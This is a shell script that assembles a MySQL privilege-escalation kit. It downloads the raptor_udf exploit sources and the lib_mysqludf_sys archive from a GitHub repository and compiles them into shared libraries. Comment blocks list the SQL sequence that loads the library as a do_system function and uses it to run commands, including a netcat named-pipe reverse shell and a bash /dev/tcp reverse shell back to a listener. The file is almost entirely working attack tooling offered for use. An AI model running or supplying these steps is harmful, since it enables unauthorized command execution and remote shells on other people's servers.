mkdir -p exploits_prevesc/mysql
cd exploits_prevesc/mysql

    # MySQL 4.0.17
    if [ ! -f raptor_udf.so ]; then
        wget -Nq https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf.c
        gcc -g -c raptor_udf.c
        gcc -g -shared -Wl,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
    fi

<< --MULTILINE-COMMENT--
        create table foo(line blob);
        insert into foo values(load_file('/tmp/raptor_udf.so'));
        select * from foo into dumpfile '/usr/lib/raptor_udf.so';
        create function do_system returns integer soname 'raptor_udf.so';
        select * from mysql.func;
        select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
        select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_local $port_local >/tmp/f');
        select do_system('bash -i >& /dev/tcp/$ip_local/$port_local 0>&1');
--MULTILINE-COMMENT--

    # MySQL 4.1.10a and MySQL 4.0.24 above
    if [ ! -f raptor_udf2.so ]; then
        wget -Nq https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
        gcc -g -c raptor_udf2.c
        gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    fi

<< --MULTILINE-COMMENT--
        create table foo(line blob);
        insert into foo values(load_file('/tmp/raptor_udf2.so'));
        select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
        create function do_system returns integer soname 'raptor_udf2.so';
        select * from mysql.func;
        select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
        select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_local $port_local >/tmp/f');
        select do_system('bash -i >& /dev/tcp/$ip_local/$port_local 0>&1');
--MULTILINE-COMMENT--

    wget -Nq https://github.com/1N3/PrivEsc/raw/master/mysql/lib_mysqludf_sys_0.0.3.tar.gz

cd -

